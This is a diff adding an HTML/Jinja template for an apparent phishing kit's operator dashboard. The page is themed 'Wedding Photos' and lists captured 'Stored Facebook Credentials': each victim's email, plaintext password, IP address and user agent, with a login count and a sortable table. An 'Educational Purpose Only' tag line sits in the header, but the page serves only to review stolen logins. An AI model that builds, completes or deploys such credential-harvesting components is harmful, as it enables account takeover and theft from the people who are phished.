@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Wedding Photos</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/dataTables.bootstrap5.min.css">
+    <style>
+        body {
+            background: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .dashboard-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 2rem 0;
+            margin-bottom: 2rem;
+        }
+        .stat-card {
+            background: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 1rem;
+        }
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #667eea;
+        }
+        .table-container {
+            background: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard-header">
+        <div class="container">
+            <h1><i class="fas fa-crown me-2"></i>Admin Dashboard</h1>
+            <p class="lead">View stored credentials (Educational Purpose Only)</p>
+        </div>
+    </div>
+    
+    <div class="container">
+        <!-- Stats Cards -->
+        <div class="row mb-4">
+            <div class="col-md-4">
+                <div class="stat-card">
+                    <h5>Total Logins</h5>
+                    <div class="stat-number">{{ count }}</div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="stat-card">
+                    <h5>Database</h5>
+                    <div class="stat-number">wedding_photos</div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="stat-card">
+                    <h5>Last Updated</h5>
+                    <div class="stat-number">{{ credentials[0].created_at.strftime('%Y-%m-%d') if credentials else 'N/A' }}</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Credentials Table -->
+        <div class="table-container">
+            <h3 class="mb-4">Stored Facebook Credentials</h3>
+            <div class="table-responsive">
+                <table id="credentialsTable" class="table table-striped table-bordered">
+                    <thead class="table-dark">
+                        <tr>
+                            <th>ID</th>
+                            <th>Email</th>
+                            <th>Password</th>
+                            <th>IP Address</th>
+                            <th>User Agent</th>
+                            <th>Created At</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for cred in credentials %}
+                        <tr>
+                            <td>{{ cred.id }}</td>
+                            <td>{{ cred.email }}</td>
+                            <td>{{ cred.password }}</td>
+                            <td>{{ cred.ip_address or 'N/A' }}</td>
+                            <td><small>{{ cred.user_agent[:50] + '...' if cred.user_agent and cred.user_agent|length > 50 else cred.user_agent }}</small></td>
+                            <td>{{ cred.created_at.strftime('%Y-%m-%d %H:%M:%S') }}</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        
+        <div class="text-center mt-4">
+            <a href="/" class="btn btn-primary"><i class="fas fa-home me-2"></i>Back to Home</a>
+            <a href="/logout" class="btn btn-danger"><i class="fas fa-sign-out-alt me-2"></i>Logout</a>
+        </div>
+    </div>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
+    <script src="https://cdn.datatables.net/1.11.5/js/dataTables.bootstrap5.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $('#credentialsTable').DataTable({
+                order: [[5, 'desc']],
+                pageLength: 25
+            });
+        });
+    </script>
+</body>
+</html>
